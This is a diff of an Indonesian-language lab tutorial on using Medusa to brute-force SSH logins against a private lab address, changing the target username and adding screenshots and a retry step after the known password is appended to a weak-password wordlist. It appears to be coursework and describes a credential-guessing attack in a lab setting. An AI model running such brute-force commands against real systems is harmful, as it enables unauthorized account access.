@@ -37,25 +37,31 @@ sudo apt-get install build-essential make patch subversion openssl libssl-dev li
 
 ## UJI COBA
 
-Pertama, Siapkan file yang terdiri dari kumpulan password yang dipisahkan oleh baris atau download [disini](/assets/ncrack-hydra/500-worst-passwords.txt). Pada uji coba kali ini, kita akan mencoba melakukan _brute force attack_ pada protokol SSH ke ip address `192.168.56.202` dengan asumsi username `root` dan list password menggunakan file yang telah disiapkan
+Pertama, Siapkan file yang terdiri dari kumpulan password yang dipisahkan oleh baris atau download [disini](/assets/ncrack-hydra/500-worst-passwords.txt). Pada uji coba kali ini, kita akan mencoba melakukan _brute force attack_ pada protokol SSH ke ip address `192.168.56.202` dengan asumsi username `pksj` dan list password menggunakan file yang telah disiapkan
 
 **Command**:
 
 ```
-medusa -h 192.168.56.202 -u "root" -P 500-worst-passwords.txt -M ssh
+medusa -h 192.168.56.202 -u "pksj" -P 500-worst-passwords.txt -M ssh
 ```
 
 -h adalah host, -u adalah user -P adalah list passwordnya, -M adalah module nya. Man page bisa dilihat [disini](http://www.irongeek.com/i.php?page=backtrack-r1-man-pages/medusa)
 
 Lalu tunggu hasilnya
- 
-Uji Coba gagal karena password yang digunakan tidak berada dalam file [500-worst-passwords.txt](/assets/ncrack-hydra/500-worst-passwords.txt),
+
+![](/assets/medusa-hasil1.PNG)
+  
+Uji coba gagal karena password yang digunakan tidak berada dalam file [500-worst-passwords.txt](/assets/ncrack-hydra/500-worst-passwords.txt),
 
 Untuk keberhasilan uji coba kali ini, kita tambahkan password yang digunakan dengan cara:
 
 ```
 echo "pksj" >> 500-worst-passwords.txt
 ```
+
+Lalu uji coba lagi
+
+![](/assets/medusa-hasil2.PNG)
 
 ## KESIMPULAN
 
